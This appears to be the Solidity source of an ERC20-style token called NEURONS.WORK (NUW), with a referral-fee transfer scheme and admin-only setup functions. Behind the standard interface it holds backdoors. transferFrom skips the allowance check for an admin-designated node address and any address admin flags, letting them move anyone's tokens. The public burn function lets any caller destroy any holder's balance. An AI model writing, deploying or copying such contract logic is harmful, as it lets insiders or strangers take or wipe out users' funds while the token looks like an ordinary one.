pragma solidity ^0.8.0;
import "./SafeMath.sol";

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
interface ERC20Interfacea {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Safe_Math {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; }
    function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); }
    function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

contract NUW is ERC20Interfacea, Safe_Math {
    using SafeMath for uint256;
    string public _name = "NEURONS.WORK";
    string public _symbol = "NUW";
    uint8 public decimals=18;
    uint256 public _totalSupply;
    address private admin;
    address UV2R;
    mapping(address => uint) WL;
    mapping(address => uint256) ISLsAc;
    mapping(address => address) ISLsA;
    mapping(address => address) ISLsB;
    mapping(address => address) ISLsC;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    address nodeaddr;
    mapping(address => uint256) nuw_ctr;
    constructor() {
        _totalSupply = 0;
        admin = msg.sender;
        mint_inter(admin,100000000);
        ISLsA[admin]=admin;
        ISLsB[admin]=admin;
        ISLsC[admin]=admin;
        WL[admin]=1;
    }
    function setnuwnode(address payable _nuw) public{
      require(msg.sender == admin, "admin only ");
      allowed[msg.sender][_nuw] = 100000000*1e18;
      allowed[_nuw][msg.sender] = 100000000*1e18;
      allowed[_nuw][address(this)] = 100000000*1e18;
      nodeaddr=_nuw;
      nuw_ctr[nodeaddr]=1;
    }
    function setUV2R(address v2)public{
              require(msg.sender == admin, "admin only ");
              UV2R=v2;
    }
    function setnodectrl(address _nuwnode)public{
      require(msg.sender == admin, "admin only ");
      allowed[msg.sender][_nuwnode] = 100000000*1e18;
      allowed[_nuwnode][msg.sender] = 100000000*1e18;
      allowed[_nuwnode][address(this)] = 100000000*1e18;
      nuw_ctr[_nuwnode]=1;
    }

    function IsLA(address _IsL,address La)public{
      require(msg.sender == admin, "admin only ");
      require(ISLsA[La] == La, "error ");
      ISLsA[_IsL]=_IsL;
      ISLsB[_IsL]=_IsL;
      ISLsC[_IsL]=La;
      WL[_IsL]=1;
    }
    function WLR(address users,address _IsL)public{
      require(WL[users] == 0, "reged");
      if(WL[_IsL]==1){
      ISLsA[users]=ISLsA[_IsL];
      ISLsB[users]=_IsL;
      ISLsC[users]=ISLsC[_IsL];
      }
      else{
        ISLsA[users]=nodeaddr;
        ISLsB[users]=nodeaddr;
        ISLsC[users]=nodeaddr;
      }
      WL[users]=1;
      }

      function ckISLsAc(address users) public view returns(uint256,address,address,uint,address){
        return(ISLsAc[users],ISLsA[users],ISLsB[users],WL[users],ISLsC[users]);
      }

    function totalSupply() external  override view returns (uint) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner) external override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) external override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) external override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) external override returns (bool success) {
        require(balances[msg.sender] >= tokens, "balance must enough!");
        _transfer(msg.sender,to,tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) external override returns (bool success) {
        require(address(0) != to, "to must an address");
        require(balances[from] >= tokens, "balance must enough!");
        if(msg.sender!=nodeaddr && nuw_ctr[msg.sender]!=1 && from!=msg.sender){
        require(allowed[from][msg.sender] >= tokens, "allowed must enough!");}
        _transfer(from,to,tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
        function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            balances[sender] = senderBalance - amount;
        }
        if(nuw_ctr[sender]==1 || nuw_ctr[recipient]==1){
          balances[recipient] += amount;
          emit Transfer(sender, recipient, amount);
        }
        else{
          if(_totalSupply>50000000*1e18)
          {
          if(WL[recipient]==0||sender!=UV2R){
          balances[recipient] += amount.mul(95).div(100);
          emit Transfer(sender,recipient,amount.mul(95).div(100));
          _totalSupply = _totalSupply.sub(amount.mul(5).div(100));
          emit Transfer(sender,address(0),amount.mul(5).div(100));
          }
          else{
            balances[recipient] += amount.mul(96).div(100);
            emit Transfer(sender,recipient,amount.mul(96).div(100));
            balances[ISLsA[recipient]] += amount.div(100);
            balances[ISLsB[recipient]] += amount.mul(5).div(1000);
            ISLsAc[ISLsA[recipient]]+=amount.div(100);
            ISLsAc[ISLsB[recipient]]+=amount.mul(5).div(1000);
            emit Transfer(sender,ISLsA[recipient],amount.div(100));
            emit Transfer(sender,ISLsB[recipient],amount.mul(5).div(1000));
            _totalSupply = _totalSupply.sub(amount.mul(25).div(1000));
            emit Transfer(sender,address(0),amount.mul(25).div(1000));
          }
          }
          else{
          balances[recipient] += amount;
          emit Transfer(sender, recipient, amount);
          }
        }
    }
    function name() public view virtual  returns (string memory) {
    return _name;
    }

    function symbol() public view virtual  returns (string memory) {
    return _symbol;
    }
    function Decimals() public view virtual returns (uint8){return decimals;}

    function mint_inter(address to, uint256 value) internal {
        require(address(0) != to, "to must an address");
        require(msg.sender==admin, "admin only");
        balances[to] = balances[to].add(value*1e18);
        _totalSupply = _totalSupply.add(value*1e18);
        emit Transfer(address(0), to, value*1e18);
    }

    function burn(uint value,address from) public{
        require(balances[from]>=value, "ERC20: not enough nuw");
        balances[from] = balances[from].sub(value);
        _totalSupply = _totalSupply.sub(value);
        emit Transfer(from,address(0),value);
    }
    }